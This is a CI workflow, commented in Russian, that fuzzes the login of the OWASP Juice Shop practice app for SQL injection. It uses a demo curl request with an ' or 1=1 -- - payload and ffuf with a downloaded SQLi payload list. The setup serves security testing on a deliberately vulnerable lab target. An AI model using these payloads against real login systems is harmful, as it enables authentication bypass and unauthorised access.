name: Fuzzing

on:
  push:
    branches: [ main ]
  pull_request:
    branches: [ main ]
  workflow_dispatch:

permissions:
  contents: write
  pull-requests: write
  security-events: write
  actions: read

jobs:
  ffuf:
    runs-on: ubuntu-latest

    services:
      juice:
        image: bkimminich/juice-shop
        ports:
          - 3000:3000

    steps:
      # 1. Ждём, пока Juice Shop поднимется, плюс явная демонстрация уязвимости curl'ом
      - name: Wait for service and demo SQLi
        run: |
          # Ждём до 60 секунд, пока главная страница отдаёт 200/304
          for i in {1..30}; do
            code=$(curl -s -o /dev/null -w "%{http_code}" http://localhost:3000 || true)
            if [ "$code" = "200" ] || [ "$code" = "304" ]; then
              echo "Juice Shop is up"
              break
            fi
            sleep 2
          done

          echo "Demo SQLi with known payload:"
          curl --path-as-is -i -s -k -X 'POST' \
            -H 'Host: localhost:3000' \
            -H 'Content-Type: application/json' \
            --data-binary '{"email":"'\'' or 1=1 -- -","password":"pass"}' \
            'http://localhost:3000/rest/user/login' \
            > demo-sqli-response.txt || true

      # 2. Качаём payload'ы и чистим от комментариев/пустых строк
      - name: Get payloads
        run: |
          wget -O SQL-Injection.txt "https://raw.githubusercontent.com/swisskyrepo/PayloadsAllTheThings/master/SQL%20Injection/Intruder/SQL-Injection"
          grep -vE '^\s*(#|$)' SQL-Injection.txt > sqli-clean.txt

          # Добавим заведомо рабочий payload в начало для проверки
          printf "' or 1=1 -- -\n" | cat - sqli-clean.txt > sqli-with-known.txt
          mv sqli-with-known.txt sqli-clean.txt

      # 3. Ставим Go и ffuf
      - name: Install fuzzing
        run: |
          sudo apt-get update -y
          sudo apt-get install -y jq
          go install github.com/ffuf/ffuf/v2@latest

      # 4. Базовый неуспешный логин для сравнения
      - name: Baseline failed login
        run: |
          curl -s -o baseline-response.json -w "%{http_code}" \
            -X POST "http://localhost:3000/rest/user/login" \
            -H "Content-Type: application/json" \
            --data '{"email":"normal@example.com","password":"wrongpass"}' \
            > baseline-status.txt || true
          echo "Baseline HTTP status:"
          cat baseline-status.txt || true

      # 5. Собственно фаззинг логина
      - name: Run fuzzing for SQLi in login
        run: |
          $HOME/go/bin/ffuf \
            -w sqli-clean.txt:FUZZ \
            -u http://localhost:3000/rest/user/login \
            -X POST \
            -H "Content-Type: application/json" \
            -d '{"email":"FUZZ","password":"pass"}' \
            -mc 200 \
            -mr '"umail"' \
            -of json \
            -o ffuf-results.json || true

          echo "ffuf results count:"
          jq '.results | length' ffuf-results.json || cat ffuf-results.json

          echo "Potential payloads that worked:"
          jq -r '.results[].input.FUZZ // empty' ffuf-results.json || true

      # 6. Считаем обнаружение успешным/нет по ffuf-results.json
      - name: Fail job if no SQLi found
        run: |
          hits=$(jq '.results | length' ffuf-results.json || echo 0)
          echo "Hits: ${hits}"
          if [ "$hits" -eq 0 ]; then
            echo "No SQL injection payloads found by ffuf"
            exit 1
          else
            echo "SQL injection detected by ffuf"
          fi

      # 7. Снимаем логи Juice Shop
      - name: Get Logs from Service
        run: |
          docker logs $(docker ps -q --filter ancestor=bkimminich/juice-shop) > juice-logs.log || true

      # 8. Загружаем все артефакты
      - name: Upload results
        uses: actions/upload-artifact@v4
        with:
          name: security-reports-bundle
          path: |
            demo-sqli-response.txt
            baseline-status.txt
            baseline-response.json
            ffuf-results.json
            juice-logs.log
